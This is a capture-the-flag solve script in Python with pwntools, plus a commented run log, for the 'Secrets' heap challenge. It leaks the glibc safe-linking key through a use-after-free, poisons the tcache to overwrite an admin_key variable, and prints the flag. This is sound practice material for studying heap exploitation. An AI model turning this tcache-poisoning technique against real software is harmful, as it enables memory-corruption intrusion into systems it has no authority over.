#!/usr/bin/env python3
from pwn import *

# Set up the binary
exe = ELF("./secrets_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"] 

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("ctf.mf.grsu.by", 9072)
    return r

def alloc_note(idx, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", data)

def free_note(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(idx).encode())

def edit_note(idx, data):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", data)

def read_note(idx):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", str(idx).encode())
    return r.recvn(0x30)

def check_admin():
    r.sendlineafter(b"> ", b"5")
    log.info("Checking admin key...")
    print(r.recvall(timeout=2).decode(errors='ignore'))

r = conn()

log.info("Starting Tcache Poisoning Attack (Count Fix)...")

# --- Step 1: Leak Safe Linking Key ---
# We need a chunk pointing to NULL to easily leak the mask
alloc_note(0, b"A"*8)
free_note(0)

# Tcache: [Chunk0] -> NULL
# Leak = (HeapAddr >> 12) ^ 0
leak_raw = read_note(0)
heap_key = u64(leak_raw[:8].ljust(8, b'\x00'))
log.success(f"Heap Safe-Linking Key leaked: {hex(heap_key)}")

# Consume the chunk to reset state
alloc_note(0, b"RESET")

# --- Step 2: Prepare Tcache Count (>= 2) ---
# We need 2 chunks in Tcache so malloc follows our poisoned pointer
alloc_note(0, b"CHUNK_A") # Re-use index 0
alloc_note(1, b"CHUNK_B")

free_note(1) # Free B first
free_note(0) # Free A second (Head)
# Tcache: [ChunkA] -> [ChunkB] -> NULL
# Count = 2

# --- Step 3: Poison Tcache ---
if 'admin_key' in exe.symbols:
    target_addr = exe.symbols['admin_key']
else:
    target_addr = 0x4040c0 # Fallback from previous run
    
log.info(f"Targeting admin_key at: {hex(target_addr)}")

# Overwrite ChunkA's FD to point to Target
# Payload = Target ^ Key
poison_payload = p64(target_addr ^ heap_key)
edit_note(0, poison_payload)
# Tcache (Logical): [ChunkA] -> [Target]
# Count = 2

# --- Step 4: Overwrite admin_key ---
# 1st alloc: Returns ChunkA. Count becomes 1.
# Tcache Head becomes Target.
alloc_note(2, b"JUNK")

# 2nd alloc: Returns Target. Count becomes 0.
# We write "HACKED" here.
alloc_note(3, b"HACKED\x00")

# --- Step 5: Win ---
check_admin()



# After running the program, you will see a result similar to this.
# └─$ python3 solve.py
# [*] '/home/ctf/Downloads/New Year CTF 2026 pwn challenge/Secrets/secrets_patched'
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     RUNPATH:    b'./'
#     Stripped:   No
# [*] '/home/ctf/Downloads/New Year CTF 2026 pwn challenge/Secrets/libc.so.6'
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     FORTIFY:    Enabled
# [!] Did not find any GOT entries
# [*] '/home/ctf/Downloads/New Year CTF 2026 pwn challenge/Secrets/ld-linux-x86-64.so.2'
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
# [+] Opening connection to ctf.mf.grsu.by on port 9072: Done
# [*] Starting Tcache Poisoning Attack (Count Fix)...
# [+] Heap Safe-Linking Key leaked: 0x17d57
# [*] Targeting admin_key at: 0x4040c0
# [*] Checking admin key...
# [+] Receiving all data: Done (39B)
# [*] Closed connection to ctf.mf.grsu.by port 9072
# grodno{4DM1n_N3_Z48YL_7C4Ch3_p0150N3D}